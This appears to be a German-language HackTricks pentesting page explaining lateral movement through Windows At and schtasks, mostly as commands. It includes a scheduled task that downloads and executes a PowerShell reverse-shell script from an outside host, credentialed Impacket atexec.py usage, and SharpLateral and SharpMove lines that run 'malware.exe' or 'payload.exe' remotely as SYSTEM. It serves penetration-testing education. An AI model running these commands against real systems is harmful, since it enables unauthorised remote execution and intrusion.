# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Wie funktioniert es?

Mit At können Tasks auf Hosts geplant werden, für die du den Benutzernamen/(das Passwort/den Hash) kennst. Dadurch kannst du Befehle auf anderen Hosts ausführen und die Ausgabe erhalten.
```
At \\victim 11:00:00PM shutdown -r
```
Mit schtasks müssen Sie zuerst die Aufgabe erstellen und sie anschließend aufrufen:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Du kannst **Impackets `atexec.py`** verwenden, um mithilfe des AT-Befehls Befehle auf Remotesystemen auszuführen. Dafür sind gültige Anmeldedaten (Benutzername und Passwort oder Hash) für das Zielsystem erforderlich.
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
Du kannst auch [SharpLateral](https://github.com/mertdas/SharpLateral) verwenden:
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Du kannst [SharpMove](https://github.com/0xthirteen/SharpMove) verwenden:
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Weitere Informationen zur [**Verwendung von schtasks mit Silver Tickets hier**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
